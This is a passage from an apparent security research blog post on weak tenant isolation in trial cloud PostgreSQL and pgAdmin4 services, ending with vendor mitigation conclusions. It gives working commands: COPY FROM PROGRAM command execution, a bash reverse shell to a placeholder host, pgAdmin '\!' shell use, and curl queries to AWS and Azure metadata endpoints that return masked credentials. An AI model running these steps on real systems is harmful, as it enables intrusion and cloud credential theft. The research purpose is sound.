+<blockquote>
+<p>boot dev proc </p>
+</blockquote>
+</div>
+<p>The function successfully returned the contents of the root directory (/), confirming that the database user had elevated privileges on the underlying host OS.</p>
+<p>To further validate the level of access, I tested for arbitrary command execution using PostgreSQL’s COPY TO PROGRAM feature. This function allows writing the output of a SQL query directly into a shell command, effectively enabling command injection from within the database context:</p>
+<div class="admonition example">
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="n">postgres</span><span class="o">=#</span><span class="w"> </span><span class="k">COPY</span><span class="w"> </span><span class="n">CONSOLE</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">PROGRAM</span><span class="w"> </span><span class="s1">&#39;id&#39;</span><span class="p">;</span>
+</span></code></pre></div>
+<blockquote>
+<p>COPY 1</p>
+</blockquote>
+</div>
+<div class="admonition example">
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="n">postgres</span><span class="o">=#</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">CONSOLE</span><span class="p">;</span>
+</span></code></pre></div>
+<blockquote>
+<p>uid=26(postgres) gid=26postgres) groups=26(postgres)</p>
+</blockquote>
+</div>
+<div class="admonition info">
+<p><img alt="" src="../../../../images/paas-isolation/command-exec.png" /></p>
+</div>
+<p>This confirmed that not only could the user list directories on the host system, but they also had the ability to execute arbitrary system-level commands via PostgreSQL. The combination of trial account access, lack of verification, and unrestricted use of administrative SQL functions represents a serious privilege escalation vector and highlights a misconfiguration in the database isolation model.</p>
+<h3 id="reverse-shell">Reverse Shell</h3>
+<p>With confirmed command execution on the remote host via PostgreSQL's COPY TO PROGRAM, the logical next step was to attempt a reverse shell to gain interactive access.</p>
+<div class="admonition example">
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="k">copy</span><span class="w"> </span><span class="n">poc</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">program</span><span class="w"> </span><span class="s1">&#39;bash -i &gt;&amp; /dev/tcp/MY_IP/MY_PORT 0&gt;&amp;1&#39;</span><span class="p">;</span>
+</span></code></pre></div>
+</div>
+<div class="admonition danger">
+<p><img alt="" src="../../../../images/paas-isolation/rev-shell0.png" /></p>
+</div>
+<div class="admonition danger">
+<p><img alt="" src="../../../../images/paas-isolation/rev-shell.png" /></p>
+</div>
+<p>After obtaining shell access, the next logical step would typically involve privilege escalation—attempting to elevate from the postgres system user to root. While I explored a few common vectors (e.g., SUID binaries, writable system paths, misconfigured sudoers), I did not pursue this further.</p>
+<h2 id="exploiting-pgadmin4-console">Exploiting PGAdmin4 Console</h2>
+<p>pgAdmin 4 is a web-based PostgreSQL administration and management tool that provides a GUI for interacting with PostgreSQL instances. Among its many features, pgAdmin 4 includes a built-in PSQL terminal, which allows users to execute raw SQL queries directly against the connected database.</p>
+<p>When deployed as a web application, pgAdmin 4 is typically hosted on a remote server and exposed through a browser-based interface. Some cloud service providers or vendors offer managed pgAdmin 4 environments, enabling users to monitor and manage PostgreSQL databases remotely via the web console.</p>
+<p>A lesser-known feature of the PSQL terminal in pgAdmin 4 is the ability to execute arbitrary shell commands on the underlying host system using the ! meta-command. For example:</p>
+<div class="admonition danger">
+<div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>admin=# \! id
+</span></code></pre></div>
+<blockquote>
+<p>uid=2000(vendor) gid=2000(vendor)</p>
+</blockquote>
+</div>
+<p>These commands are executed directly on the server where pgAdmin 4 is hosted—not on the database server itself unless both are co-located. This provides a pathway to Remote Code Execution (RCE) if users are improperly granted access to pgAdmin 4 with insufficient isolation or access controls.</p>
+<p>Given the ability to execute shell commands, it's also possible to establish a reverse shell from the host to an external machine under the attacker's control. This level of access highlights a critical risk in multi-tenant or shared environments where administrative interfaces like pgAdmin 4 are exposed without proper role-based access control or sandboxing. Once RCE is achieved via the ! command, the attacker effectively gains an entry point for further post-exploitation activities.</p>
+<h2 id="ssrf">SSRF</h2>
+<h3 id="aws">AWS</h3>
+<p>After achieving Remote Code Execution (RCE) on the target host, the next step was to determine whether the compromised environment had access to cloud instance metadata services—specifically the AWS EC2 Instance Metadata Service (IMDS).</p>
+<p>Using standard tools like curl, I was able to successfully query the metadata endpoint from within the compromised environment:</p>
+<div class="admonition example">
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="k">COPY</span><span class="w"> </span><span class="n">poc</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">PROGRAM</span><span class="w"> </span><span class="s1">&#39;curl http://169.254.169.254/latest/meta-data/&#39;</span><span class="p">;</span>
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">poc</span><span class="p">;</span>
+</span></code></pre></div>
+</div>
+<div class="admonition danger">
+<p><img alt="" src="../../../../images/paas-isolation/ssrf.png" /></p>
+</div>
+<p>While no IAM role was explicitly listed under the usual /iam/security-credentials/ path—indicating that no IAM role was attached to the instance. </p>
+<div class="admonition example">
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="k">COPY</span><span class="w"> </span><span class="n">poc</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">PROGRAM</span><span class="w"> </span><span class="s1">&#39;curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance&#39;</span><span class="p">;</span>
+</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">poc</span><span class="p">;</span>
+</span></code></pre></div>
+<blockquote>
+<div class="language-json highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="p">{</span>
+</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a><span class="w">  </span><span class="nt">&quot;Code&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Success&quot;</span><span class="p">,</span>
+</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a><span class="w">  </span><span class="nt">&quot;LastUpdated&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2022-08-15T10:39:09Z&quot;</span><span class="p">,</span>
+</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a><span class="w">  </span><span class="nt">&quot;Type&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;AWS-HMAC&quot;</span><span class="p">,</span>
+</span><span id="__span-13-5"><a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a><span class="w">  </span><span class="nt">&quot;AccessKeyId&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;ASIA5XXXXXXXXTJLPXX5&quot;</span><span class="p">,</span>
+</span><span id="__span-13-6"><a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a><span class="w">  </span><span class="nt">&quot;SecretAccessKey&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;r3AySnEXXXXX8TPzH3NyXXXXX0rZPDp8XXXXX&quot;</span><span class="p">,</span>
+</span><span id="__span-13-7"><a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a><span class="w">  </span><span class="nt">&quot;Token&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;IQoJb3JpZ2luX2VjEFM...XXXXXX&quot;</span><span class="p">,</span>
+</span><span id="__span-13-8"><a id="__codelineno-13-8" name="__codelineno-13-8" href="#__codelineno-13-8"></a><span class="w">  </span><span class="nt">&quot;Expiration&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2022-08-15T16:59:52Z&quot;</span>
+</span><span id="__span-13-9"><a id="__codelineno-13-9" name="__codelineno-13-9" href="#__codelineno-13-9"></a><span class="p">}</span>
+</span></code></pre></div>
+</blockquote>
+</div>
+<div class="admonition example">
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>aws<span class="w"> </span>sts<span class="w"> </span>get-caller-identity<span class="w"> </span>--profile<span class="w"> </span>review
+</span></code></pre></div>
+<blockquote>
+<div class="language-json highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="p">{</span>
+</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a><span class="w">    </span><span class="nt">&quot;UserId&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;9XXXX51XXXXX:aws:ec2-instance:i-095373XX129fXXafb&quot;</span><span class="p">,</span>
+</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a><span class="w">    </span><span class="nt">&quot;Account&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;9XXXX51XXXXX&quot;</span><span class="p">,</span>
+</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a><span class="w">    </span><span class="nt">&quot;Arn&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;arn:aws:sts::9XXXX51XXXXX:assumed-role/aws:ec2-instance/i-095373XX129fXXafb&quot;</span>
+</span><span id="__span-15-5"><a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a><span class="p">}</span>
+</span></code></pre></div>
+</blockquote>
+</div>
+<p>While the credentials were successfully retrieved and valid, they had no actionable IAM permissions attached, effectively preventing further lateral movement or access to AWS services via the API. This is consistent with default-deny IAM policies or minimal-permission roles designed for EC2 telemetry or monitoring only.</p>
+<h3 id="azure">Azure</h3>
+<p>When operating in a cloud environment, it’s common to check for instance metadata services to extract environmental details or credentials. While AWS uses the well-known http://169.254.169.254/latest/meta-data/ endpoint, this is not universal—different cloud providers expose metadata through different APIs and often with provider-specific headers or versioning requirements.</p>
+<p>If querying the standard AWS metadata endpoint fails, it's worth checking for other cloud providers such as Azure, GCP, Oracle Cloud, or Alibaba Cloud. A comprehensive and actively maintained list of cloud metadata endpoints is available here:</p>
+<p>For example, in a PostgreSQL environment where RCE has been achieved, the Azure metadata service can be queried as follows:</p>
+<div class="admonition example">
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="n">postgres</span><span class="o">=#</span><span class="w"> </span><span class="k">CREATE</span><span class="w"> </span><span class="k">TABLE</span><span class="w"> </span><span class="n">poc</span><span class="p">(</span><span class="k">data</span><span class="w"> </span><span class="nb">TEXT</span><span class="p">);</span>
+</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a><span class="n">postgres</span><span class="o">=#</span><span class="w"> </span><span class="k">COPY</span><span class="w"> </span><span class="n">poc</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">PROGRAM</span><span class="w"> </span><span class="s1">&#39;curl -H &quot;Metadata:true&quot; &quot;http://169.254.169.254/metadata/instance?api-version=2021-12-13&quot;&#39;</span><span class="p">;</span>
+</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a><span class="n">postgres</span><span class="o">=#</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">poc</span><span class="p">;</span>
+</span></code></pre></div>
+<blockquote>
+<div class="language-json highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="w">    </span><span class="err">&lt;TRUNCATED</span><span class="w"> </span><span class="err">DATA&gt;</span><span class="w">                                                             </span><span class="err">+</span>
+</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a><span class="s2">&quot;,&quot;</span><span class="err">pa</span><span class="kc">t</span><span class="err">h</span><span class="s2">&quot;:&quot;</span><span class="err">/home/azureuser/.ssh/au</span><span class="kc">t</span><span class="err">horized_keys</span><span class="s2">&quot;}],</span>
+</span><span id="__span-17-3"><a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a><span class="s2">&quot;</span><span class="err">publisher</span><span class="s2">&quot;:&quot;</span><span class="err">Ope</span><span class="kc">n</span><span class="err">Logic</span><span class="s2">&quot;,&quot;</span><span class="err">resourceGroupName</span><span class="s2">&quot;:&quot;</span><span class="err">XXXX</span><span class="s2">&quot;,&quot;</span><span class="err">resourceId</span><span class="s2">&quot;:&quot;</span><span class="err">/subscrip</span><span class="kc">t</span><span class="err">io</span><span class="kc">ns</span><span class="err">/</span><span class="mf">8e</span><span class="err">d</span><span class="mf">21e</span><span class="kc">f</span><span class="mi">0-1</span><span class="err">d</span><span class="mi">5</span><span class="err">b</span><span class="mi">-4</span><span class="err">cea</span><span class="mi">-</span><span class="err">b</span><span class="mi">7</span><span class="kc">ff</span><span class="mi">-707</span><span class="kc">f</span><span class="err">c</span><span class="mi">51</span><span class="err">b</span><span class="mi">65</span><span class="err">c</span><span class="mi">4</span><span class="err">/resourceGroups/XXXXXX/providers/Microso</span><span class="kc">ft</span><span class="err">.Compu</span><span class="kc">te</span><span class="err">/vir</span><span class="kc">tual</span><span class="err">Machi</span><span class="kc">nes</span><span class="err">/SG</span><span class="mi">-</span><span class="err">XXXXXX</span><span class="s2">&quot;,&quot;</span><span class="err">securi</span><span class="kc">t</span><span class="err">yPro</span><span class="kc">f</span><span class="err">ile</span><span class="s2">&quot;:{&quot;</span><span class="err">e</span><span class="kc">n</span><span class="err">cryp</span><span class="kc">t</span><span class="err">io</span><span class="kc">n</span><span class="err">A</span><span class="kc">t</span><span class="err">Hos</span><span class="kc">t</span><span class="s2">&quot;:&quot;</span><span class="kc">false</span><span class="s2">&quot;,</span>
+</span><span id="__span-17-4"><a id="__codelineno-17-4" name="__codelineno-17-4" href="#__codelineno-17-4"></a><span class="s2">&quot;</span><span class="err">secureBoo</span><span class="kc">t</span><span class="err">E</span><span class="kc">na</span><span class="err">bled</span><span class="s2">&quot;:&quot;</span><span class="kc">false</span><span class="s2">&quot;,&quot;</span><span class="err">securi</span><span class="kc">t</span><span class="err">yType</span><span class="s2">&quot;:&quot;&quot;,&quot;</span><span class="err">vir</span><span class="kc">tual</span><span class="err">TpmE</span><span class="kc">na</span><span class="err">bled</span><span class="s2">&quot;:&quot;</span><span class="kc">false</span><span class="s2">&quot;},</span>
+</span><span id="__span-17-5"><a id="__codelineno-17-5" name="__codelineno-17-5" href="#__codelineno-17-5"></a><span class="s2">&quot;</span><span class="err">sku</span><span class="s2">&quot;:&quot;</span><span class="mi">7-</span><span class="err">CI</span><span class="s2">&quot;,&quot;</span><span class="err">s</span><span class="kc">t</span><span class="err">oragePro</span><span class="kc">f</span><span class="err">ile</span><span class="s2">&quot;:{&quot;</span><span class="err">da</span><span class="kc">ta</span><span class="err">Disks</span><span class="s2">&quot;:[{&quot;</span><span class="err">by</span><span class="kc">tes</span><span class="err">PerSeco</span><span class="kc">n</span><span class="err">dThro</span><span class="kc">ttle</span><span class="s2">&quot;:&quot;&quot;,&quot;</span><span class="err">cachi</span><span class="kc">n</span><span class="err">g</span><span class="s2">&quot;:&quot;</span><span class="err">No</span><span class="kc">ne</span><span class="s2">&quot;,&quot;</span><span class="err">crea</span><span class="kc">te</span><span class="err">Op</span><span class="kc">t</span><span class="err">io</span><span class="kc">n</span><span class="s2">&quot;:&quot;</span><span class="err">A</span><span class="kc">tta</span><span class="err">ch</span><span class="s2">&quot;,&quot;</span><span class="err">diskCapaci</span><span class="kc">t</span><span class="err">yBy</span><span class="kc">tes</span><span class="s2">&quot;:&quot;&quot;,&quot;</span><span class="err">diskSizeGB</span><span class="s2">&quot;:&quot;</span><span class="mi">10</span><span class="s2">&quot;,&quot;</span><span class="err">image</span><span class="s2">&quot;:{&quot;</span><span class="err">uri</span><span class="s2">&quot;:&quot;&quot;},&quot;</span><span class="err">isSharedDisk</span>
+</span><span id="__span-17-6"><a id="__codelineno-17-6" name="__codelineno-17-6" href="#__codelineno-17-6"></a><span class="err">&quot;</span>
+</span><span id="__span-17-7"><a id="__codelineno-17-7" name="__codelineno-17-7" href="#__codelineno-17-7"></a><span class="err">&lt;TRUNCATED DATA&gt; </span>
+</span></code></pre></div>
+</blockquote>
+</div>
+<h2 id="conclusions">Conclusions</h2>
+<p>Many cloud service vendors treat these architectural trade-offs as acceptable risks, prioritizing user convenience and frictionless onboarding—especially for trial or freemium-tier accounts. To streamline the developer experience, vendors often relax security boundaries in non-production tiers, which can inadvertently expose shared infrastructure to abuse.</p>
+<p>Some vendors attempt to mitigate cross-tenant risks by employing virtual machine-level isolation for each user session or deployment. This approach reduces the attack surface associated with shared compute or database environments, albeit with increased operational cost.</p>
+<p>However, when it comes to abuse of trial environments by malicious users—for example, for lateral movement, metadata extraction, or external pivoting—many vendors adopt a reactive posture. They typically rely on runtime behavioral monitoring, rate-limiting, and abuse detection rather than proactively sandboxing capabilities.</p>
+<p>A few vendors do take precautionary measures by disabling privileged operations (e.g., superuser or administrative SQL functions) in trial accounts. This is a positive step toward reducing the blast radius of potential exploitation attempts and enforcing least privilege by default.</p>
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+  
+
+
+
+      
+    </article>
+  </div>
+
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      <script id="__config" type="application/json">{"base": "../../../..", "features": ["navigation.tabs", "content.code.copy", "content.code.annotate"], "search": "../../../../assets/javascripts/workers/search.d50fe291.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../../../assets/javascripts/bundle.50899def.min.js"></script>
+      
+    
+  </body>
+</html>
